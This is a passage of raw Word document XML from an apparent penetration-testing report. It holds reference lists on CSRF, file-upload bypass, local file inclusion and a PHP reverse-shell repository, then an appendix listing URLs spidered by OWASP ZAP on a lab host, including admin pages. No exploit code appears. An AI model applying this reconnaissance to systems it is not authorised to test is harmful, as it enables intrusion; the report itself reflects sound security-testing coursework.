                <w:jc w:val="left"/>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
              </w:pPr>
            </w:p>
            <w:p w14:paraId="013779B2" w14:textId="77777777" w:rsidR="00E46A6E" w:rsidRDefault="00E46A6E" w:rsidP="00EB748F">
              <w:pPr>
                <w:pStyle w:val="Heading2"/>
                <w:numPr>
                  <w:ilvl w:val="0"/>
                  <w:numId w:val="0"/>
                </w:numPr>
                <w:ind w:left="578" w:hanging="578"/>
                <w:jc w:val="left"/>
                <w:rPr>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
              </w:pPr>
              <w:bookmarkStart w:id="60" w:name="_Toc58836609"/>
              <w:r>
                <w:rPr>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Further Reading</w:t>
              </w:r>
              <w:bookmarkEnd w:id="60"/>
            </w:p>
            <w:p w14:paraId="4844434F" w14:textId="77777777" w:rsidR="00E46A6E" w:rsidRPr="003F330D" w:rsidRDefault="00E46A6E" w:rsidP="00EB748F">
              <w:pPr>
                <w:jc w:val="left"/>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Academy, W., 2020. </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>What Is CSRF (Cross-Site Request Forgery)? Tutorial &amp; Examples | Web Security Academy</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>. [online] Portswigger.net. Available at: &lt;https://portswigger.net/web-security/csrf&gt; [Accessed 12 December 2020].</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="7DD6F687" w14:textId="77777777" w:rsidR="00E46A6E" w:rsidRPr="0006217C" w:rsidRDefault="00E46A6E" w:rsidP="00EB748F">
              <w:pPr>
                <w:jc w:val="left"/>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Sushant747.gitbooks.io. 2020. </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Bypass File Upload Filtering · Total OSCP Guide</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>. [online] Available at: &lt;https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html&gt; [Accessed 12 December 2020].</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="3ABC93A0" w14:textId="77777777" w:rsidR="00E46A6E" w:rsidRDefault="00E46A6E"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CHANDEL, R., 2020. </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Comprehensive Guide On Dirb Tool</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>. [online] Hacking Articles. Available at: &lt;https://www.hackingarticles.in/comprehensive-guide-on-dirb-tool/&gt; [Accessed 27 October 2020].</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="6F784141" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="004C5A8F"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Owasp.org. 2020. </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Cross Site Request Forgery (CSRF) | OWASP Foundation</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>. [online] Available at: &lt;https://owasp.org/www-community/attacks/csrf&gt; [Accessed 12 December 2020].</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="736C5C89" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="004C5A8F"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Gary C. Kessler, C., 2020. </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>File Signatures</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>. [online] Garykessler.net. Available at: &lt;https://www.garykessler.net/library/file_sigs.html&gt; [Accessed 12 December 2020].</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="1F26F2C6" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="004C5A8F"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Softwaretestinghelp.com. 2020. </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>OWASP ZAP Tutorial: Comprehensive Review Of OWASP ZAP Tool</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>. [online] Available at: &lt;https://www.softwaretestinghelp.com/owasp-zap-tutorial/&gt; [Accessed 13 November 2020].</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="343C6B46" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="004C5A8F"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Pentestmonkey, 2020. </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Pentestmonkey/Php-Reverse-Shell</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>. [online] GitHub. Available at: &lt;https://github.com/pentestmonkey/php-reverse-shell&gt; [Accessed 12 December 2020].</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="0CEC3200" w14:textId="77777777" w:rsidR="004C5A8F" w:rsidRDefault="004C5A8F" w:rsidP="00EB748F">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ZION3R, 2020. </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Zap-Hud - The OWASP ZAP Heads Up Display (HUD)</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>. [online] KitPloit - PenTest &amp; Hacking Tools. Available at: &lt;https://www.kitploit.com/2020/10/zap-hud-owasp-zap-heads-up-display-hud.html&gt; [Accessed 6 November 2020].</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="126D7C35" w14:textId="77777777" w:rsidR="00F832BA" w:rsidRDefault="00F832BA" w:rsidP="00EB748F">
              <w:pPr>
                <w:jc w:val="left"/>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
              </w:pPr>
            </w:p>
            <w:p w14:paraId="5C46EE1C" w14:textId="0D42B54E" w:rsidR="00341658" w:rsidRDefault="00324BE7" w:rsidP="00EB748F">
              <w:pPr>
                <w:jc w:val="left"/>
                <w:rPr>
                  <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
                  <w:color w:val="000000"/>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
              </w:pPr>
            </w:p>
          </w:sdtContent>
        </w:sdt>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="53321FB7" w14:textId="32DEE191" w:rsidR="00F832BA" w:rsidRPr="00F832BA" w:rsidRDefault="00F832BA" w:rsidP="00F832BA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B805869" w14:textId="75CC7AB9" w:rsidR="00F832BA" w:rsidRPr="00F832BA" w:rsidRDefault="00F832BA" w:rsidP="00F832BA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="408D0F75" w14:textId="7E96C5E7" w:rsidR="00F832BA" w:rsidRPr="00F832BA" w:rsidRDefault="00F832BA" w:rsidP="00F832BA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="79333D47" w14:textId="3DC2D17E" w:rsidR="00F832BA" w:rsidRDefault="00F832BA" w:rsidP="00F832BA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75EB9C9F" w14:textId="415C0508" w:rsidR="00F832BA" w:rsidRDefault="00F832BA" w:rsidP="00F832BA">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>References 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C1AE0EC" w14:textId="77777777" w:rsidR="00ED3417" w:rsidRPr="00ED3417" w:rsidRDefault="00ED3417" w:rsidP="00ED3417">
      <w:pPr>
        <w:keepNext/>
        <w:keepLines/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="auto"/>
        </w:pBdr>
        <w:spacing w:before="600" w:after="440"/>
        <w:ind w:left="578" w:hanging="578"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:caps/>
          <w:color w:val="274221" w:themeColor="accent4" w:themeShade="80"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED3417">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:caps/>
          <w:color w:val="274221" w:themeColor="accent4" w:themeShade="80"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">References </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B81713B" w14:textId="62112931" w:rsidR="00ED3417" w:rsidRDefault="00ED3417" w:rsidP="00ED3417">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Muscat, I., 2021. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>What Is Local File Inclusion?</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>. [online] Acunetix. Available at: &lt;https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/&gt; [Accessed 8 January 2021].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47661DFC" w14:textId="3C0852B4" w:rsidR="00ED3417" w:rsidRDefault="00ED3417" w:rsidP="00ED3417">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Sanz, F., 2021. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Make My Upload Folder Non-Executable</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>. [online] Stack Overflow. Available at: &lt;https://stackoverflow.com/questions/21501462/make-my-upload-folder-non-executable&gt; [Accessed 9 January 2021].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2659A626" w14:textId="78257DE0" w:rsidR="00ED3417" w:rsidRPr="00ED3417" w:rsidRDefault="00ED3417" w:rsidP="00ED3417">
      <w:pPr>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Varghese, J., 2021. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Cross Site Request Forgery: Not Quite Extinct!</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>. [online] Astra. Available at: &lt;https://www.getastra.com/blog/knowledge-base/cross-site-request-forgery-csrf-example-fix/&gt; [Accessed 8 January 2021].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE198CE" w14:textId="77777777" w:rsidR="00ED3417" w:rsidRPr="00ED3417" w:rsidRDefault="00ED3417" w:rsidP="00ED3417">
      <w:pPr>
        <w:keepNext/>
        <w:keepLines/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="1" w:color="auto"/>
        </w:pBdr>
        <w:spacing w:before="600" w:after="440"/>
        <w:ind w:left="578" w:hanging="578"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:caps/>
          <w:color w:val="274221" w:themeColor="accent4" w:themeShade="80"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED3417">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
          <w:b/>
          <w:bCs/>
          <w:caps/>
          <w:color w:val="274221" w:themeColor="accent4" w:themeShade="80"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Further Reading</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0239D56F" w14:textId="26F6E963" w:rsidR="00F832BA" w:rsidRPr="00F832BA" w:rsidRDefault="00ED3417" w:rsidP="00ED3417">
      <w:pPr>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:lang w:val="en-GB" w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Wordfence. 2021. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Wordpress Security - File Upload Vulnerabilities</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>. [online] Available at: &lt;https://www.wordfence.com/learn/how-to-prevent-file-upload-vulnerabilities/&gt; [Accessed 8 January 2021].</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28298649" w14:textId="77777777" w:rsidR="00801886" w:rsidRPr="009A241B" w:rsidRDefault="00341658" w:rsidP="009525A9">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="431"/>
      </w:pPr>
      <w:bookmarkStart w:id="61" w:name="_Toc58836610"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Appendices</w:t>
      </w:r>
      <w:bookmarkEnd w:id="61"/>
    </w:p>
    <w:p w14:paraId="5C115764" w14:textId="77777777" w:rsidR="009A241B" w:rsidRDefault="00341658" w:rsidP="00341658">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="578" w:hanging="578"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="62" w:name="_Toc58836611"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">Appendix </w:t>
      </w:r>
      <w:r w:rsidR="00514AB7">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:bookmarkEnd w:id="62"/>
    </w:p>
    <w:p w14:paraId="20526C00" w14:textId="77777777" w:rsidR="00396EED" w:rsidRDefault="00B44FC9" w:rsidP="008641AC">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="63" w:name="_Toc58836612"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00514AB7">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>.1</w:t>
      </w:r>
      <w:r w:rsidR="008641AC">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> Zap Spidering</w:t>
      </w:r>
      <w:bookmarkEnd w:id="63"/>
    </w:p>
    <w:p w14:paraId="1505F938" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21369C2F" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/Changepassword.php?id=15</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47126B73" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/GTIGCCGDCCFM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28B0F358" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/GTIGCCGDCCFM/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27744545" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/GTIGCCGDCCFM/?C=S;O=D</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32923ACA" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/GTIGCCGDCCFM/doornumbers.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EE61F3E" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/aboutus.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D49486B" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/access-denied.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F6C01DF" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D90890D" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE684AC" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/access-denied.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="627CA93A" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>http://192.168.1.20/admin/accounts.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="637501E4" w14:textId="77777777" w:rsidR="00514AB7" w:rsidRDefault="00514AB7" w:rsidP="00514AB7">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
